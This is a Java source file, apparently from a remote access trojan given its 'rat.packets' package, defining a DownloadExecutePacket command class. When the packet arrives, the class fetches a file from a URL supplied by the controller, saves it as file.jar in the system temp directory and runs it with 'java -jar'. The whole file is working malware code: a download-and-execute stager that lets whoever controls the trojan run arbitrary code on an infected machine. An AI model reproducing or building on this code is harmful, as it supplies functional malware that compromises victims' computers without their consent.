package rat.packets;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Paths;

public class DownloadExecutePacket implements IPacket, Serializable {

    private static final long serialVersionUID = 940539337939322711L;

    private String fileName = "file.jar";

    private String websitePath;

    public DownloadExecutePacket(String websitePath) {
        this.websitePath = websitePath;
    }

    @Override
    public void execute() {
        System.out.println("Executing package!!");
        String downloadPath = Paths.get(System.getProperty("java.io.tmpdir")).toAbsolutePath().toString();
        if (!downloadPath.endsWith(File.separator)) {
            downloadPath += File.separator;
        }
        downloadPath += fileName;

        try {
            URL website = new URL(websitePath);
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos = new FileOutputStream(downloadPath);
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);

            Runtime.getRuntime().exec("java -jar " + downloadPath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.DOWNLOAD_EXECUTE;
    }
}
